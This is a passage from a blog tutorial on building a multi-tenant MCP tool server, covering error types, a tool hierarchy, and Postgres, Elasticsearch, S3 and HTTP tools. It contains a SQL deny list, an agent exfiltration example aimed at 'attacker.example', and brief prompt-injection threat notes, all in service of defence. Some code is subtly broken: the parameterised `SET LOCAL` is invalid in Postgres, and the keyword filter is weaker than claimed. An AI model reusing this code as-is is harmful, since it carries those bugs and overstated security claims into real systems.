    """ATBA budget or per-tool timeout was exhausted."""

    def __init__(self, tool: str, budget_ms: int):
        super().__init__(
            code="timeout",
            retryable=True,
            hint=f"tool {tool!r} exceeded {budget_ms}ms budget",
            context={"tool": tool, "budget_ms": budget_ms},
        )

class ToolNotFoundError(ToolError):

    def __init__(self, name: str):
        super().__init__(
            code="tool_not_found",
            retryable=False,
            hint=f"unknown tool {name!r}",
            context={"tool": name},
        )
```

`UpstreamError` is the one where `retryable` varies. A Postgres syntax error is `retryable=False` (the same SQL will fail the same way), but a Postgres connection timeout is `retryable=True` (the next attempt might succeed).

**We will see this distinction play out in the circuit breaker in section 7, it only counts transient failures toward opening the circuit.**

`TimeoutError_` has a trailing underscore to avoid shadowing Python's builtin `TimeoutError`. This is a common Python naming convention when you need to reuse a builtin's name.

Now the most important method, **wire format conversion**:

```c
def to_mcp_error(exc: ToolError) -> ErrorData:
    """Convert an Atlas ToolError into the MCP on-the-wire shape.
    
    The MCP protocol allows structured \`\`data\`\` on errors. We use it to carry
    our full SERF payload, so MCP hosts that understand Atlas can parse the
    hints, and hosts that do not still get a human-readable \`\`message\`\`.
    """

    return ErrorData(
        code=-32000,  # JSON-RPC application error
        message=f"{exc.code}: {exc.hint or ''}",
        data=exc.to_dict(),
    )
```

This is where the SERF payload meets the MCP protocol.

1. MCP uses JSON-RPC under the hood, and JSON-RPC errors have a `code`, `message`, and optional `data` field.
2. We shove our full SERF dictionary into `data`. Hosts that understand Atlas can parse the `data.retryable` and `data.hint` fields and make smart decisions.
3. Hosts that only read `message` still get a human-readable string. The best of both worlds.

`-32000` is the JSON-RPC convention for application errors. The spec reserves specific codes like `-32600` for "invalid request", and `-32000` to `-32099` for server-defined errors.

**So now we have a complete error vocabulary. Every other component in Atlas-MCP raises one of these types**. The auth middleware raises `AuthError`, the policy engine raises `PolicyError`, the rate limiter raises `RateLimitError`, the tool validators raise `ValidationError`, and the atomic tools raise `UpstreamError`. Nothing else leaks to the agent.

> That consistency is what makes agent retry logic actually work in production.

## The Tool Execution Engine

Now we reach the core of the server: **the tool execution engine**. This is the layer that actually *does* things on behalf of the agent.

**Most MCP tutorials treat “tools” as a flat list of Python functions**. That works for a demo with three tools. It breaks down the moment you have 87 tools ([which is the median number reported in the April 2026 production case study on large enterprise MCP deployments](https://fordelstudios.com/research/mcp-production-engineering-guide?utm_source=chatgpt.com)).

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ak49o0j_5qLbvvM-zkkF_A.png)

Tool Execution Logic (Created by Fareed Khan )

> Why does it break down? Because agents construct brittle multi-step plans from low-level atomic primitives.

An agent given only `postgres.query`, `elasticsearch.search`, and `vector.search` will try to chain them in weird ways. Give that same agent a higher-level `customer.build_context` tool that already knows the right fan-out pattern, and it will just call that instead.

That same case study measured a **~40% reduction in erroneous tool calls** after introducing a tiered tool hierarchy. This is not a minor optimization, it is the architectural pattern that makes 87-tool servers usable.

We are going to build a **three-level hierarchy**:

Three Levels (Created by

[Fareed Khan](https://medium.com/u/b856005e5ecd?source=post_page---user_mention--de92127aca6f---------------------------------------)

)

### Input Validation Schemas

Before we build tools, we need the envelope that every tool call flows through. This is Component 5.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*wn-ZhrrI1mBBiE7bGxvLGQ.png)

Input Validation Schemas (Created by Fareed Khan )

Create `src/atlas_mcp/validation/schemas.py`:

```c
"""Component 5, Validation schemas.
The tool envelope is the one shape the dispatch pipeline speaks. Every MCP
request that reaches \`\`_dispatch\`\` has been normalised into this dataclass,
so auth, rate limiting, caching, and execution all read from the same object.
Per-tool input validation lives on the Tool subclasses themselves.
This module only describes the envelope around the tool call.
"""

from __future__ import annotations
from dataclasses import dataclass
from typing import Any

@dataclass(frozen=True, slots=True)
class ToolCallEnvelope:
    """Normalised shape of an incoming MCP tool call."""
    tool: str
    arguments: dict[str, Any]
    tenant: str
    caller: str

    # The trace ID threads through metrics, logs, and OTel spans so you can
    # pivot from a Grafana panel to the Jaeger trace to the audit log line
    # that describes a single agent call.
    trace_id: str | None = None

    # Delegator is the human who authorised the agent. Audit logs include it
    # so "who actually asked for this" survives the agent layer.
    delegator: str | None = None
```

The envelope is `frozen=True, slots=True` because it is immutable value type that flies through the dispatch pipeline. `slots=True` also **makes it memory-efficient**, which matters when you are processing thousands of calls per second.

**Notice that the envelope does not have per-tool arguments typed.** The arguments are just a `dict[str, Any]`. Per-tool validation happens later, inside each `Tool` subclass's Pydantic schema. We will see that next.

### Three Level Tool Hierarchy

Now the `Tool` base class in `src/atlas_mcp/tools/base.py`. This is the contract every tool must satisfy:

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*I_2IM_HcUtxUe7mOWnTp1w.png)

Level Tool Hierarchy (Created by Fareed Khan )

```c
"""Component 6, Tool Execution Engine.

Every tool in Atlas-MCP is an instance of Tool. The production lesson baked
into this design is the three-level hierarchy:
* Atomic tools wrap a single primitive operation on a single backend.
* Composed tools chain a small, fixed set of atomic tools behind one name.
* Workflow tools wrap a multi-step agentic procedure.

Agents pick the right granularity; the server does not force them into the
atomic layer if a composed tool already encodes the common intent.
"""

from __future__ import annotations
import hashlib
import json

from abc import ABC, abstractmethod
from dataclasses import dataclass

from enum import Enum
from typing import ClassVar
from pydantic import BaseModel

from atlas_mcp.auth.policy import PolicyEngine
from atlas_mcp.errors.framework import ValidationError

class ToolLevel(str, Enum):
    ATOMIC = "atomic"
    COMPOSED = "composed"
    WORKFLOW = "workflow"

@dataclass
class ToolMetadata:
    """Descriptive metadata surfaced via list_tools and /.well-known."""
    name: str
    description: str
    level: ToolLevel
    scopes_required: tuple[str, ...] = ()
    destructive: bool = False
    cacheable: bool = True
    cache_ttl_seconds: int = 60
    timeout_ms: int = 10_000
    tags: tuple[str, ...] = ()
```

The `ToolMetadata` is how every tool describes itself to the world. `scopes_required` tells the registry which scopes are needed to see this tool, `destructive` flags whether it goes through the approval gate, `cacheable` plus `cache_ttl_seconds` control caching behavior, and `timeout_ms` is the per-call deadline.

Then the `Tool` abstract base:

```c
class Tool(ABC):
    """Base class. Subclass, declare a schema, implement run."""

    # Subclasses MUST override these class attributes.
    meta: ClassVar[ToolMetadata]
    input_schema: ClassVar[type[BaseModel]]

    def __init__(self, policy: PolicyEngine):
        self.policy = policy

    # ── Public surface used by the dispatch pipeline ───────────────────
    def validate(self, arguments: dict) -> BaseModel:
        """Component 5 entry point. Raises ValidationError on bad input."""

        try:
            return self.input_schema.model_validate(arguments)
        except Exception as exc:
            raise ValidationError(
                code="invalid_arguments",
                retryable=False,
                hint=_summarise_pydantic_error(exc),
                context={"tool": self.meta.name},
            ) from exc

    def cache_key(self, tenant: str, args: BaseModel) -> str:
        """Deterministic hash used by the Component 9 cache layer."""
        payload = {"tool": self.meta.name, "tenant": tenant, "args": args.model_dump(mode="json")}
        blob = json.dumps(payload, sort_keys=True, default=str).encode()
        return f"atlas:{self.meta.name}:{hashlib.sha256(blob).hexdigest()[:24]}"

    @property
    def cacheable(self) -> bool:
        return self.meta.cacheable

    @property
    def cache_ttl_seconds(self) -> int:
        return self.meta.cache_ttl_seconds
    async def execute(self, tenant: str, args: BaseModel) -> dict:
        """Called by the dispatch pipeline after all guards have passed."""
        return await self.run(tenant, args)

    @abstractmethod
    async def run(self, tenant: str, args: BaseModel) -> dict:
        """The actual work. Raise UpstreamError for backend failures."""
        ...
```

Three methods matter here.

1. `validate()` is the entry point for Component 5. It takes the raw arguments dict from MCP and runs them through the tool's Pydantic schema. If validation fails, it raises our `ValidationError` with a concise hint like `sql: only SELECT statements permitted`. That hint goes back to the agent, which can then fix its arguments. A typical traceback would have told the agent nothing.
2. `cache_key()` produces a deterministic SHA-256 hash of `(tool, tenant, args)`. This is what the cache layer uses, and it includes the tenant so caches never cross tenant boundaries. Even if two tenants run the exact same query, they get different cache keys.
3. `run()` is abstract. Subclasses implement it. This is the only method a tool author actually writes.

The helper for Pydantic error summarization:

```c
def _summarise_pydantic_error(exc: Exception) -> str:
    """Condense pydantic errors into one agent-readable line."""

    if hasattr(exc, "errors"):

        errs = exc.errors()  # type: ignore[attr-defined]

        if errs:
            first = errs[0]
            loc = ".".join(str(p) for p in first.get("loc", []))
            return f"{loc}: {first.get('msg', 'invalid')}"

    return str(exc)
```

Pydantic errors are verbose by default, multiple errors, field paths as tuples, rich context.

> That is great for humans debugging but overwhelming for an LLM that needs to decide what to do next.

We condense to one line: `field: reason`. Short, actionable, trainable.

### Tool Registry & Discovery

Now we need a place to hold all the tools. Create `src/atlas_mcp/tools/registry.py`:

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*aOlWeRWbs4Zz1-sTfSH_Jw.png)

Tool Registry (Created by Fareed Khan )

```c
"""Component 4, Tool Registry & Discovery.

Two jobs:
1. Maintain an in-memory index of available tools so list_tools and
   call_tool can resolve by name without a disk hit per request.
2. Expose a /.well-known/mcp-server endpoint that lets registries,
   crawlers, and MCP hosts discover what this server offers without
   connecting a session first.
"""

from __future__ import annotations
from typing import Iterable

from mcp.types import Tool as MCPToolSpec

from starlette.requests import Request
from starlette.responses import JSONResponse

from atlas_mcp.errors.framework import ToolNotFoundError
from atlas_mcp.tools.base import Tool

class ToolRegistry:
 
    def __init__(self) -> None:
        self._tools: dict[str, Tool] = {}
  
    def register(self, tool: Tool) -> None:
        name = tool.meta.name
        if name in self._tools:
            raise ValueError(f"tool {name!r} already registered")
        self._tools[name] = tool
```

The registry holds tools in a dict keyed by name. Registering a duplicate name raises immediately, this catches copy-paste errors at startup rather than at runtime.

The discovery method walks our tool packages and registers everything:

```c
async def discover(self, policy=None) -> None:
        """Load tools from the atlas_mcp.tools.* packages."""

        from atlas_mcp.auth.policy import PolicyEngine
        from atlas_mcp.tools.atomic.elasticsearch import ElasticsearchSearchTool
        from atlas_mcp.tools.atomic.http_client import HTTPFetchTool

        from atlas_mcp.tools.atomic.postgres import PostgresQueryTool
        from atlas_mcp.tools.atomic.s3_storage import S3GetTool, S3PutTool

        from atlas_mcp.tools.atomic.vector_search import VectorSearchTool
        from atlas_mcp.tools.composed.hybrid_search import HybridSearchTool

        from atlas_mcp.tools.composed.semantic_search import SemanticSearchTool
        from atlas_mcp.tools.workflow.customer_context import CustomerContextTool

     if policy is None:
            policy = PolicyEngine(rules=[], default_deny=False)

        # Atomic (Level 1)
        for cls in (
            PostgresQueryTool, ElasticsearchSearchTool, VectorSearchTool,
            S3GetTool, S3PutTool, HTTPFetchTool,
        ):
            self.register(cls(policy))

        # Composed (Level 2)
        for cls in (SemanticSearchTool, HybridSearchTool):
            self.register(cls(policy))

        # Workflow (Level 3)
        for cls in (CustomerContextTool,):
            self.register(cls(policy))
```

For clarity, we do explicit imports here. The registration happens in level order, atomic first, then composed, then workflow. This is not strictly required but it makes the registry output readable.

Now the **visibility filter**, which is the key to keeping the agent’s context clean:

```c
def list_visible(self, tenant: str, scopes: Iterable[str]) -> list[MCPToolSpec]:
        """Hide tools whose required scopes the caller does not hold.

        This is a list-time filter, not a call-time authorization, policy
        still runs on every invocation. The filter exists so agents do not
        see tools they cannot use, which keeps their context window clean
        and their tool-choice accuracy high.
        """
        scope_set = set(scopes)
        visible = []
        for tool in self._tools.values():
            if not all(s in scope_set or "tool:*:admin" in scope_set for s in tool.meta.scopes_required):
                continue
            visible.append(_to_mcp_spec(tool))
        return visible
```

This is a **list-time filter**, not a call-time authorization.

1. Policy still runs on every invocation (we saw that in `_dispatch`). The filter exists because of a practical LLM behavior: models pick the right tool better when they only see tools they can actually use.
2. An agent with `tool:postgres:read` should not even see `s3.put_object` in its context, because then the LLM might try to use it and hit a policy denial.

Finally, the `/.well-known/mcp-server` endpoint:

```c
async def well_known_endpoint(self, _request: Request) -> JSONResponse:
        """Serve unauthenticated capability metadata.

        Only non-sensitive summary is exposed here: tool names, levels, and
        descriptions. Input schemas and policy details require a session.
        """

        return JSONResponse(
            {
                "protocol_version": "2025-11",
                "server": {"name": "atlas-mcp", "version": "0.1.0"},
                "capabilities": {
                    "tools": {"list_changed": True},
                    "prompts": {},
                    "resources": {},
                },
                "tools_summary": [
                    {
                        "name": t.meta.name,
                        "level": t.meta.level.value,
                        "description": t.meta.description,
                        "tags": list(t.meta.tags),
                    }
                    for t in self._tools.values()
                ],
                "authorization_server": {
                    "issuer": "https://auth.atlas.local",
                    "metadata_url": (
                        "https://auth.atlas.local/.well-known/oauth-authorization-server"
                    ),
                },
            }
        )
```

The well-known document is unauthenticated, because registries need to crawl it without a token. But it only exposes **non-sensitive summary** information (tool names, levels, descriptions, tags). Input schemas and policy details require a real session. This is the 2026 MCP roadmap’s capability-discovery pattern.

### Atomic Tools

Now we build the actual tools. We start with **atomic tools**, one primitive on one backend.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*_FkTce8pQvhivvTZAKDTKA.png)

Atomic Tools (Created by Fareed Khan )

Let’s create the **Postgres atomic tool** first in `src/atlas_mcp/tools/atomic/postgres.py`. It exposes a narrowly-scoped read-only interface over Postgres:

```c
"""Atomic Postgres query tool, Level 1 of the three-level hierarchy.

Exposes a narrowly-scoped read-only interface over Postgres. The tool
refuses to execute anything other than a SELECT. Write operations live in
their own tool with destructive=True and human-in-the-loop approval.
Why separate read and write: agents routinely attempt to combine them when
given an unrestricted SQL surface. Splitting them turns a prompt injection
into a policy rejection instead of a dropped table.
"""

from __future__ import annotations
from typing import Any, ClassVar

import asyncpg

from pydantic import BaseModel, Field, field_validator

from atlas_mcp.auth.policy import PolicyEngine
from atlas_mcp.config import get_settings
from atlas_mcp.errors.framework import UpstreamError
from atlas_mcp.tools.base import Tool, ToolLevel, ToolMetadata

_FORBIDDEN_KEYWORDS = (
    "INSERT", "UPDATE", "DELETE", "DROP", "TRUNCATE", "ALTER",
    "CREATE", "GRANT", "REVOKE", "COPY", "CALL", "EXECUTE",
)
```

The forbidden keywords list is our **defense-in-depth** against prompt injection. Even if the policy engine has a bug, this list makes it impossible for any SQL containing `DROP` to execute through this tool.

Now the Pydantic schema that validates inputs:

```c
class PostgresQueryInput(BaseModel):
    sql: str = Field(..., description="A single SELECT statement.")
    params: list[Any] = Field(default_factory=list, description="Positional parameters.")
    max_rows: int = Field(100, ge=1, le=1000)

    @field_validator("sql")
    @classmethod
    def must_be_select(cls, value: str) -> str:

        stripped = value.strip().rstrip(";")

        if not stripped:
            raise ValueError("sql is required")
        head = stripped.split(None, 1)[0].upper()

        if head not in {"SELECT", "WITH"}:
            raise ValueError("only SELECT or WITH statements are permitted")
        upper = stripped.upper()

        for kw in _FORBIDDEN_KEYWORDS:
            # Word-boundary check: "UPDATE_TS" is allowed, "UPDATE " is not.
            if f" {kw} " in f" {upper} " or upper.startswith(f"{kw} "):
                raise ValueError(f"forbidden keyword: {kw}")

        # Reject multiple statements.
        if ";" in stripped:
            raise ValueError("only one statement per call")

        return stripped
```

Let’s understand what is happening.

1. We strip trailing semicolons and whitespace.
2. We check the first keyword must be `SELECT` or `WITH` (for CTEs). Anything else, rejected.
3. We scan the entire SQL for any forbidden keyword as a **word boundary** match. Notice `UPDATE_TS` is allowed (not a reserved keyword, just a column name), but `UPDATE ` with a space is not. This is a small detail that avoids false positives.
4. We reject multiple statements (no `;` inside the SQL), which prevents SQL injection via statement chaining.

`max_rows` is capped at 1000. An agent cannot accidentally exhaust memory by asking for 10 million rows.

Then the tool class itself:

```c
class PostgresQueryTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="postgres.query",
        description="Execute a single read-only SELECT against the Postgres warehouse.",
        level=ToolLevel.ATOMIC,
        scopes_required=("tool:postgres:read",),
        destructive=False,
        cacheable=True,
        cache_ttl_seconds=30,
        timeout_ms=5_000,
        tags=("postgres", "sql", "read"),
    )
    input_schema: ClassVar[type[BaseModel]] = PostgresQueryInput

    _pool: asyncpg.Pool | None = None
    def __init__(self, policy: PolicyEngine):
        super().__init__(policy)
        self.settings = get_settings()
    
    async def _ensure_pool(self) -> asyncpg.Pool:
        if PostgresQueryTool._pool is None:
            PostgresQueryTool._pool = await asyncpg.create_pool(
                self.settings.postgres_dsn,
                min_size=2,
                max_size=10,
                command_timeout=self.meta.timeout_ms / 1000,
            )
        return PostgresQueryTool._pool
```

The `_pool` is a **class variable**, not an instance variable. This is deliberate. We want a single shared connection pool across all `PostgresQueryTool` instances because opening a new pool per instance would blow up our Postgres connection limit. `min_size=2, max_size=10` gives us elasticity without hammering the database.

`command_timeout` is tied to the tool's `timeout_ms`, so any query that runs longer than 5 seconds gets cancelled at the driver level.

The actual execution:

```c
async def run(self, tenant: str, args: PostgresQueryInput) -> dict:
        pool = await self._ensure_pool()

        try:
            async with pool.acquire() as conn:
                # Tenant isolation is enforced at the row-security level in Postgres.
                # We set the tenant id on the connection before every query.
                await conn.execute("SET LOCAL app.tenant_id = $1", tenant)
                rows = await conn.fetch(
                    f"{args.sql} LIMIT {args.max_rows}", *args.params
                )

        except asyncpg.PostgresError as exc:
            # Distinguish deterministic query errors from transient ones.
            retryable = isinstance(exc, (asyncpg.ConnectionDoesNotExistError,
                                         asyncpg.InterfaceError,
                                         asyncpg.TooManyConnectionsError))
            raise UpstreamError(
                code="postgres_error",
                retryable=retryable,
                hint=str(exc).splitlines()[0],
                context={"sqlstate": getattr(exc, "sqlstate", None)},
            ) from exc

        return {
            "columns": list(rows[0].keys()) if rows else [],
            "rows": [dict(r) for r in rows],
            "row_count": len(rows),
            "truncated": len(rows) >= args.max_rows,
        }
```

Three important things happen here.

1. First, `SET LOCAL app.tenant_id = $1` sets the session variable we wired into the RLS policy back in section 2. From this line on, Postgres physically cannot return rows from any other tenant. This is the **database-level enforcement** that our section 2 RLS policies rely on.
2. Second, when Postgres raises an error, we classify it as **retryable or deterministic**. Connection errors, interface errors, and “too many connections” are transient, the agent should retry. Syntax errors and constraint violations are deterministic, no amount of retrying will fix them. This distinction is exactly what the circuit breaker needs, which we will see in section 7.
3. Third, we return a structured result with `columns`, `rows`, `row_count`, and `truncated`. The `truncated` flag tells the agent whether there were more rows than `max_rows`, so it can decide to paginate.

Now the **Elasticsearch tool** in `src/atlas_mcp/tools/atomic/elasticsearch.py`. Same pattern:

```c
class ElasticsearchSearchInput(BaseModel):
    index: str = Field(..., description="Index or index pattern.")
    query: dict = Field(..., description="Elasticsearch DSL query body.")
    size: int = Field(20, ge=1, le=200)
    fields: list[str] | None = Field(default=None)

class ElasticsearchSearchTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="elasticsearch.search",
        description="Run a DSL search against an Elasticsearch index.",
        level=ToolLevel.ATOMIC,
        scopes_required=("tool:elasticsearch:read",),
        cacheable=True,
        cache_ttl_seconds=30,
        timeout_ms=3_000,
        tags=("elasticsearch", "search", "read"),
    )

    input_schema: ClassVar[type[BaseModel]] = ElasticsearchSearchInput
```

The interesting bit is how we inject **tenant isolation into the query body**:

```c
async def run(self, tenant: str, args: ElasticsearchSearchInput) -> dict:
        # Tenant isolation: every tenant's documents are tagged, and we
        # inject a mandatory filter so a tenant can never read another's data.
        body = {
            "query": {"bool": {"must": [args.query], "filter": [{"term": {"_tenant": tenant}}]}},
            "size": args.size,
        }
        if args.fields:
            body["_source"] = args.fields

        try:
            resp = await self._es().search(index=args.index, body=body)
        except (ApiError, TransportError) as exc:
            status = getattr(exc, "status_code", None)
            retryable = status in (408, 429, 500, 502, 503, 504)
            raise UpstreamError(
                code="elasticsearch_error",
                retryable=retryable,
                hint=str(exc)[:200],
                context={"status": status},
            ) from exc
        hits = resp["hits"]["hits"]
        return {
            "total": resp["hits"]["total"]["value"],
            "took_ms": resp["took"],
            "hits": [
                {"id": h["_id"], "score": h["_score"], "source": h.get("_source", {})}
                for h in hits
            ],
        }
```

Elasticsearch does not have row-level security like Postgres. So we do tenant isolation at the query layer, we wrap the agent’s query in a `bool.must` and add a mandatory `filter` clause that pins `_tenant == tenant`.

The agent cannot escape this because we control the query construction. Even if the agent sends `{"match_all": {}}`, it still gets filtered to its own tenant.

> Error retryability follows HTTP status codes. 408, 429, and 5xx are retryable (transient). 4xx other than 408/429 are not, those are bad requests.

The **vector search tool** in `src/atlas_mcp/tools/atomic/vector_search.py` follows the same pattern. The schema and tenant injection:

```c
class VectorSearchInput(BaseModel):
    collection: str = Field(..., description="Qdrant collection name.")
    vector: list[float] = Field(..., min_length=1, description="Query embedding.")
    top_k: int = Field(10, ge=1, le=100)
    filter: dict[str, Any] | None = Field(default=None, description="Qdrant filter object.")

class VectorSearchTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="vector.search",
        description="Nearest-neighbour search against a Qdrant collection.",
        level=ToolLevel.ATOMIC,
        scopes_required=("tool:vector:read",),
        cacheable=True,
        cache_ttl_seconds=300,
        timeout_ms=2_000,
        tags=("vector", "qdrant", "retrieval"),
    )

    input_schema: ClassVar[type[BaseModel]] = VectorSearchInput

    async def run(self, tenant: str, args: VectorSearchInput) -> dict:
        # Tenant isolation: we inject a filter clause that pins the tenant.
        tenant_filter = {"must": [{"key": "tenant", "match": {"value": tenant}}]}
        combined_filter = tenant_filter

        if args.filter:
            # Merge user filter under the tenant-mandatory one.
            combined_filter = {
                "must": tenant_filter["must"] + (args.filter.get("must") or []),
                "should": args.filter.get("should"),
                "must_not": args.filter.get("must_not"),
            }
            combined_filter = {k: v for k, v in combined_filter.items() if v is not None}
```

> Same story: tenant injected via a mandatory `must` clause. User filters are merged *under* the tenant filter, so they can refine but never escape.

**Important design decision**: this tool does not embed the query text. It takes a pre-computed vector as input. That separation means:

1. Agents can reuse an embedding across multiple searches.
2. Embedding model changes do not require a server redeploy.
3. The vector tool has the narrowest possible blast radius.

The end-to-end “text in, passages out” behavior is what our **composed** semantic search tool provides, which we will see shortly.

For **S3**, we have two separate tools: `S3GetTool` for reads and `S3PutTool` for writes, because writes are destructive and go through the approval gate:

```c
class S3PutTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="s3.put_object",
        description="Write a text object to the Atlas S3 bucket. Requires human approval.",
        level=ToolLevel.ATOMIC,
        scopes_required=("tool:s3:write",),
        destructive=True,  # ← flags this for the approval gate
        cacheable=False,
        timeout_ms=5_000,
        tags=("s3", "storage", "write"),
    )
    input_schema: ClassVar[type[BaseModel]] = S3PutInput
```

The `destructive=True` flag is what causes the governance layer from section 4 to intercept this call and create a pending approval instead of executing. Reads do not need approval, writes do.

The S3 tools also prefix every object with the tenant id so the bucket layout enforces isolation physically:

```c
async def run(self, tenant: str, args: S3PutInput) -> dict:
        prefixed_key = _tenant_key(tenant, args.key)

        try:
            async with self._session.client("s3", endpoint_url=self.settings.s3_endpoint) as s3:
                await s3.put_object(
                    Bucket=self.settings.s3_bucket,
                    Key=prefixed_key,
                    Body=args.content.encode("utf-8"),
                    ContentType=args.content_type,
                    Metadata={"tenant": tenant},
                )
        # ... error handling logic similar to what i build previously ...
        return {"key": args.key, "bytes_written": len(args.content.encode("utf-8"))}

    def _tenant_key(tenant: str, key: str) -> str:
    """Prefix every object with the tenant id so the layout enforces isolation."""
    return f"{tenant}/{key.lstrip('/')}"
```

If the agent asks to write `reports/2026.txt`, it actually gets written to `acme/reports/2026.txt`. Even if a policy bug lets tenant A write a `put_object` call, it still physically cannot overwrite tenant B's data.

The **HTTP fetch tool** in `src/atlas_mcp/tools/atomic/http_client.py` is where the outbound allowlist from section 4 meets the execution layer:

```c
class HTTPFetchInput(BaseModel):
    url: str = Field(..., description="Fully-qualified https:// URL.")
    method: str = Field("GET", description="GET, POST, PUT, DELETE, PATCH.")
    headers: dict[str, str] | None = Field(default=None)
    body: dict | None = Field(default=None, description="JSON body.")
    timeout_s: float = Field(10.0, ge=0.5, le=30.0)

    @field_validator("url")
    @classmethod
    def must_be_https(cls, value: str) -> str:
        parsed = urlparse(value)
        if parsed.scheme != "https":
            raise ValueError("only https:// URLs are permitted")
        if not parsed.hostname:
            raise ValueError("missing hostname")
        return value

    @field_validator("method")
    @classmethod
    def method_in_allowlist(cls, value: str) -> str:
        upper = value.upper()
        if upper not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
            raise ValueError("unsupported method")
        return upper
```

Two hard constraints: **HTTPS only** (no plain HTTP, ever) and **known methods only**.

The actual execution:

```c
async def run(self, tenant: str, args: HTTPFetchInput) -> dict:

        host = urlparse(args.url).hostname or ""

        if not self._allowed(tenant, host):
            raise PolicyError(
                "host_not_allowlisted",
                retryable=False,
                hint=f"{host!r} is not on this tenant's outbound allowlist",
                context={"host": host},
            )
        try:
            async with httpx.AsyncClient(timeout=args.timeout_s, follow_redirects=False) as client:
                resp = await client.request(
                    args.method, args.url, headers=args.headers or {}, json=args.body
                )

        except httpx.TimeoutException as exc:
            raise UpstreamError("http_timeout", retryable=True, hint=str(exc)) from exc

        except httpx.RequestError as exc:
            raise UpstreamError("http_network_error", retryable=True, hint=str(exc)) from exc

        # Cap response size to protect the agent's context window.
        body_bytes = resp.content[:64 * 1024]

        return {
            "status": resp.status_code,
            "headers": dict(resp.headers),
            "body": body_bytes.decode("utf-8", errors="replace"),
            "truncated": len(resp.content) > len(body_bytes),
        }
```
1. The host check is the **defense against prompt injection data exfiltration**. If the agent decides to fetch `https://attacker.example/exfil?token=...`, the host is not on the tenant's allowlist and we raise `PolicyError`.
2. Notice it is a `PolicyError`, not an `UpstreamError`, because this is a policy violation, not an upstream failure.
3. `follow_redirects=False` matters a lot. Without it, an allowlisted host could redirect to a non-allowlisted one, bypassing our check.

By disabling redirects, we force the agent to see the 3xx response and make an explicit decision about where to go next.

> The 64 KB body cap protects the agent context window from being blown up by a huge HTML response.

### Composed Tools

Now **composed tools**, Level 2. These chain a small fixed set of atomic tools behind one name.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*AJSO9lKfw0RLBNij7Ggepw.png)

Composed tools (Created by Fareed Khan )

The **semantic search tool** in `src/atlas_mcp/tools/composed/semantic_search.py` is a good example:

```c
"""Composed semantic search, Level 2.

Chains three atomic operations behind a single agent-facing tool:
1. Embed the query text.
2. Vector-search a given collection.
3. Hydrate the top results with their full document bodies from Postgres.
Why this exists as its own tool: an agent that did the same thing using
three atomic calls would burn context, make three authorisation decisions,
and get three separate cache lines. The composed tool does it once, with
one policy check and one cache entry. Agents overwhelmingly reach for the
composed tool when it exists, exactly the behaviour we want.
"""

class SemanticSearchInput(BaseModel):
    query: str = Field(..., min_length=1, max_length=4000)
    collection: str = Field(..., description="Vector collection to search.")
    top_k: int = Field(5, ge=1, le=25)
    hydrate_from_postgres: bool = Field(
        True, description="If true, fetch full document bodies by id from Postgres."
    )

class SemanticSearchTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="semantic_search",
        description=(
            "Retrieve passages from the knowledge base using dense vector search. "
            "Prefer this over vector.search unless you have a pre-computed embedding."
        ),
        level=ToolLevel.COMPOSED,
        scopes_required=("tool:vector:read", "tool:postgres:read"),
        cacheable=True,
        cache_ttl_seconds=120,
        timeout_ms=8_000,
        tags=("rag", "retrieval", "semantic"),
    )

    input_schema: ClassVar[type[BaseModel]] = SemanticSearchInput

    def __init__(self, policy: PolicyEngine):
        super().__init__(policy)
        self.embedder = EmbeddingClient()
        self.vector_tool = VectorSearchTool(policy)
        self.postgres_tool = PostgresQueryTool(policy)
```

Notice that a composed tool **declares multiple scopes** (`tool:vector:read, tool:postgres:read`). If the caller does not have both, the tool does not appear in their `list_tools` response. This also means a composed tool only gets **one policy check** at the envelope layer, not one per inner atomic call.

The execution chains the three steps:

```c
async def run(self, tenant: str, args: SemanticSearchInput) -> dict:
        # 1. Embed.
        vectors = await self.embedder.embed([args.query])
        query_vector = vectors[0]

        # 2. Vector search.
        vs_args = VectorSearchInput(
            collection=args.collection, vector=query_vector, top_k=args.top_k
        )

        vs_result = await self.vector_tool.run(tenant, vs_args)
        matches = vs_result["matches"]

        if not matches:
            return {"query": args.query, "results": []}

        # 3. Optional hydration from Postgres, bulk lookup by id.
        if not args.hydrate_from_postgres:
            return {
                "query": args.query,
                "results": [
                    {
                        "id": m["id"],
                        "score": m["score"],
                        "preview": (m["payload"].get("text") or "")[:300],
                        "metadata": {k: v for k, v in m["payload"].items() if k != "text"},
                    }
                    for m in matches
                ],
            }

        ids = [str(m["id"]) for m in matches]

        pg_args = PostgresQueryInput(
            sql="SELECT id, title, body, url FROM documents WHERE id = ANY($1::text[])",
            params=[ids],
            max_rows=args.top_k,
        )

        pg_result = await self.postgres_tool.run(tenant, pg_args)
        by_id = {str(r["id"]): r for r in pg_result["rows"]}
        results = []

        for m in matches:
            doc = by_id.get(str(m["id"]), {})
            results.append({
                "id": m["id"],
                "score": m["score"],
                "title": doc.get("title"),
                "body": doc.get("body"),
                "url": doc.get("url"),
                "metadata": {k: v for k, v in m["payload"].items() if k != "text"},
            })

        return {"query": args.query, "results": results}
```

This is a fixed 3-step chain. No LLM in the loop, no branching. That is why it is called a **composed** tool rather than a workflow. Step 1 embeds the query, step 2 does vector search, step 3 hydrates full documents from Postgres via a bulk lookup.

The **hybrid search tool** is similar but fuses lexical and dense retrieval using Reciprocal Rank Fusion (RRF):

```c
class HybridSearchTool(Tool):
    meta: ClassVar[ToolMetadata] = ToolMetadata(
        name="hybrid_search",
        description=(
            "Hybrid lexical + semantic retrieval with Reciprocal Rank Fusion. "
            "Prefer this for queries that mix technical keywords with natural language."
        ),
        level=ToolLevel.COMPOSED,
        scopes_required=("tool:vector:read", "tool:elasticsearch:read"),
        cacheable=True,
        cache_ttl_seconds=120,
        timeout_ms=10_000,
        tags=("rag", "retrieval", "hybrid", "rrf"),
    )

    input_schema: ClassVar[type[BaseModel]] = HybridSearchInput

    async def run(self, tenant: str, args: HybridSearchInput) -> dict:
        # Run lexical + embedding concurrently for lower latency.
        import asyncio
